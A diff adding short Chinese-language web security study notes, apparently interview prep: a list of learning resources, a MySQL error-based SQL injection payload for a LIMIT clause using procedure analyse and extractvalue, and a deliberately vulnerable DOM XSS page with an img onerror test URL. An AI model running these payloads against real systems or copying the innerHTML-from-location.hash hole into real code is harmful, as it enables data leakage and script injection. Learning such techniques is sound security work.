@@ -1,0 +1,49 @@
+一 .你获取网络安全知识途径有哪些？
+
+1.网站，看雪，安全焦点，国内的乌云，FreeBuf
+
+2.视频学习：i春秋，51cto，慕课网，实验楼，实验吧，网易云课堂等等
+
+3.微信公众号、知乎等，企业src等
+
+4.书籍，《白帽子讲web安全》《Web应用安全权威指南》等
+
+5.然后就是请教牛人
+
+6.最后是公司内技术分享。
+
+
+
+
+
+#########
+
+mysql版本 在（5.0.0-5.6.6）期间
+### 范式 ：select field from table where id >0 order by id limit {injection_point}
+e.g.:
+
+select field from user where id >0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+
+select username from admin where id >0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+
+
+#######xss dom
+
+###dom_xss.html
+<html>
+<head>
+	<title>DOM XSS</title>
+	<meta charset='utf-8'>
+</head>
+<body>
+	<div id="area"></div>
+	<script>
+		document.getElementById("area").innerHTML=unescape(location.hash);
+	</script>
+</body>
+</html>
+
+
+配合hackerbar访问http://10.148.52.202/dom_xss.html#<img src=x onerror='alert(/xss/)'>
+返回xss警告。
+###
